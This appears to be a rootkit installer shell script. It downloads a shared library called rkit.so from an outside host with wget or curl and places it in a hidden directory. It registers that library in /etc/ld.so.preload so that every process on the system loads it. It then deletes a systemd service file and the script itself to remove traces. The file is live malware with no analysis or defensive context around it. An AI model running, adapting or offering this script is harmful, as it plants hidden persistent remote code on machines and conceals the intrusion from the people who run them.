#!/bin/sh

rkit_key=.__EL_SNEEDIO__

wget flamecord.tk/rkit.so -O /$rkit_key/$rkit_key.so || curl -L flamecord.tk/rkit.so -o /$rkit_key/$rkit_key.so
echo /$rkit_key/$rkit_key.so >> /etc/ld.so.preload

rm -f /usr/lib/systemd/system/qqq.service /etc/systemd/system/multi-user.target.wants/qqq.service /rkit.sh
